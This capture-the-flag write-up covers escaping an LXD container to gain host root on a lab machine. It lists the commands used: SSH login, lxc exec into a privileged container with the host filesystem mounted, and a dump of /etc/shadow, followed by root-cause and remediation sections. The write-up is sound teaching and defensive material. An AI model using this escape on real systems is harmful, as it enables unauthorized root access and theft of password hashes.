# LXD Escape — CTF Writeup

**Category:** Linux Privilege Escalation / Container Escape
**Difficulty:** Medium
**Target:** `172.31.12.22`

## Summary

An ordinary user was granted membership in the `lxd` group. While this doesn't grant `sudo` or direct root access, LXD group membership is effectively equivalent to root on the host — a member can create a container with `security.privileged=true` and mount the host's root filesystem (`/`) into it as a disk device. Since a privileged container shares the host's UID namespace, root inside the container **is** root on the host filesystem.

## Recon

```bash
nmap 172.31.12.22
```

Only port `22/tcp` (SSH) was open — no HTTP or other services to explore, so SSH access was the sole entry point.

## Initial Access

SSH in with the provided low-hanging-fruit credentials:

```bash
ssh user@172.31.12.22
# password: user
```

## Enumeration

Checked current privileges:

```bash
id
```

```
uid=1004(user) gid=1005(user) groups=1005(user),997(lxd)
```

Membership in the `lxd` group was the key finding — this group has no meaningful restrictions on what containers it can create or how they're configured.

Refreshed group membership in the current shell (group changes don't apply to an already-open session):

```bash
newgrp lxd
```

Checked existing LXD resources:

```bash
lxc image list
lxc list
```

An Alpine image (`myalpine`) and a pre-existing container (`privesc`) were already present on the box — no need to build or transfer a new image.

## Exploitation

Inspected the existing container's configuration:

```bash
lxc config show privesc
```

Output showed it was already misconfigured for escape:

```yaml
config:
  security.privileged: "true"
devices:
  host-root:
    path: /mnt/host
    source: /
    type: disk
```

`security.privileged: "true"` disables user namespace isolation, and the `host-root` device mounts the entire host `/` into the container at `/mnt/host`.

Exec'd into the container:

```bash
lxc exec privesc /bin/sh
```

Since the container is privileged, this shell is root — and root inside the container maps directly to root on the host.

## Post-Exploitation

Navigated to the mounted host filesystem:

```sh
cd /mnt/host
ls
```

Dumped `/etc/shadow` (root and user password hashes, readable as host root):

```sh
cat etc/shadow
```

Located and read the flag:

```sh
find /mnt/host/root -type f
cat /mnt/host/root/flag.txt
```

## Flag

```
ctf{GieY5xeegeija9neisaep7kox2coo8ye}
```

## Root Cause

- The `user` account was added to the `lxd` group, likely for convenience (e.g. to manage containers without `sudo`).
- LXD's Unix socket permissions treat `lxd` group membership as trusted — no further authorization is required to create privileged containers or attach arbitrary host paths as devices.
- A privileged container (`security.privileged=true`) does **not** remap UIDs into an unprivileged range, so root in the container is root on the host. Combined with a host disk mount, this gives full read/write access to the host filesystem.

## Remediation

- **Never add unprivileged users to the `lxd`, `docker`, or `libvirt` groups** unless they are meant to have root-equivalent access to the host. Treat group membership as equivalent to `sudo ALL=(ALL) NOPASSWD:ALL`.
- If users need to manage containers without full host access, use:
  - Unprivileged containers only (`security.privileged=false`, the default) — note this alone is not a complete mitigation if users can still mount host paths.
  - LXD's **fine-grained authorization** (`lxc auth` / RBAC via Candid or OIDC) to restrict what container configs a given identity can create.
  - Restrict or audit `disk` device additions, since arbitrary host-path mounts are the actual escape primitive here, not privilege alone.
- Regularly audit `/etc/group` for unexpected members of high-privilege groups (`lxd`, `docker`, `sudo`, `adm`, `disk`).

## Key Takeaway

> On a system with LXD installed, being in the `lxd` group is root. There is no meaningful boundary between "container administrator" and "host root" unless fine-grained authorization is explicitly configured.
